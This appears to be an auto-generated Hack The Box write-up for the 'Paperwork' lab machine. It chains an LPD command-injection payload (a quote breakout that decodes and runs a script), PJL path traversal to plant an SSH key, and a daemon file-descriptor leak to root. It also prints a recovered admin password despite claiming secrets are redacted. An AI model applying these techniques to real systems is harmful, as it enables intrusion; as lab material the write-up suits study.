# Paperwork — Hack The Box Writeup

> **Platform:** HTB · **Target:** `paperwork.htb` · **OS:** Linux · **Services:** 22, 80, 1515

---

## Summary

Target exposed 3 open ports. **2 flags captured**. **2 credentials recovered**. 3 vulnerabilit identified. 39 solver scripts available.

**Foothold:** archivist via LPD injection -> PJL FSDOWNLOAD -> SSH key (SSH)

**Tooling:** ``pjl_exploit.py` (130 lines)`


---

## Kill Chain

**Reconnaissance**

- Starting session-start recon validation for Paperwork.htb (10.129.50.159). Mode: lab_mode (HTB). Known: ports 22, 80, 1515. LPD injection found previously but all outbound exfil failed.
- Ports: 5 open on 10.129.50.159. 22:ssh OpenSSH 10., 80:http nginx 1.28, 1515:ifor-protocol?, udp/53:domain, udp/68:dhcpc
- OS profile 'Linux' loaded. Payload: elf. Skill: privesc-specialist. Foothold vectors: SSH brute / default creds, Web RCE / file upload, SQLi -> RCE (outfile/UDF), LFI -> log poisoning -> RCE, Redis unauthenticated RCE
- HTTP: 0 live URLs. CMS: none. Clues: none.
- Vulns: 0 nuclei, 0 nikto, 0 service, 8 KB matches
- Recon complete. PaperWork.htb: 3 TCP ports (22/SSH, 80/HTTP, 1515/LPD). Web app: Python/nginx Document Archiving Service. Source code at /download/archive reveals LPD command injection. Valid queue: 'archive_intake'. All outbound exfiltration failed previously. Attack vectors: LPD injection -> bind

**Exploitation**

- LPD protocol command injection via subprocess.Popen(shell=True) with unsanitized job_name from cfA control file. Queue: archive_intake. Payload: single-quote breakout Jtest';echo SFRCezx9bW0...|base64 -d>/tmp/s.sh;sh /tmp/s.sh;echo '

**Foothold**

- Initial foothold as 'lp' user via LPD reverse shell. Discovered PJL/JetDirect service on localhost:9100 from /etc/printcap analysis
- User flag captured: [REDACTED] from /home/archivist/user.txt

**Privilege Escalation**

- PJL FSDOWNLOAD with directory traversal (0:\..\.ssh\authorized_keys) wrote SSH public key to /home/archivist/.ssh/authorized_keys, enabling SSH as archivist
- Discovered paperworks-daemon (root) Unix socket at /run/paperwork/mgmt.sock. The daemon leaks privileged file descriptors via SCM_RIGHTS over the socket
- Root privesc: Poisoned /tmp/paperwork/commands.log with 'FSUPLOAD' entry, connected to /run/paperwork/mgmt.sock, received admin_fd for /etc/paperwork/admin_pins.conf via SCM_RIGHTS. Extracted ADMIN_PASSWORD=ApparelMortuaryCedar22
- Root flag captured: [REDACTED] from /root/root.txt


---

## Ports & Services

| Port | Service | Version | Notes |
| ---- | ------- | ------- | ----- |
| 22 | ssh | OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 |  |
| 80 | http | nginx 1.28.0 (Ubuntu) |  |
| 1515 | lpd | Archive_Printer LPD (RFC 1179) | Archive_Printer is ready and printing. |

---

## Findings

| Service | Type | Severity | Detail |
| ------- | ---- | -------- | ------ |
| Web (port 80) | Source Code Disclosure | MEDIUM | /download/archive serves a ZIP containing application source code server.py (2820 bytes) |
| Web (port 80) | Information Disclosure | LOW | Internal system names, queue name 'archive_intake', and protocol details exposed on homepage |

---

*All testing performed in an authorised Hack The Box lab environment. Full walkthroughs are published for retired machines only; flags and secrets are redacted.*